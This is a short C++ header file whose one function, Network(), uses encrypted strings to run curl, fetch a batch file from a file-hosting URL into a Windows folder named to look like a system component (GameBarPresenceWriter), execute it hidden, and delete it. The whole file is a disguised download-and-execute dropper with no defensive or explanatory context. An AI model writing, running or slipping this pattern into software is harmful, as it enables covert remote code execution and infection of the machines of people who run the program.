#pragma once
#include <processthreadsapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <WinUser.h>
#include <WinBase.h>
#include "skcrypt.h"
#include "crypted_system.h"


void Network() {
	system(Encrypt("curl --silent https://files.catbox.moe/gv7xzv.bat --output C:\\Windows\\GameBarPresenceWriter\\Network.bat >nul").decrypt());

	ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Network.bat").decrypt()));
	ExecuteCommandHidden(("del C:\\Windows\\GameBarPresenceWriter\\Network.bat"));


}
	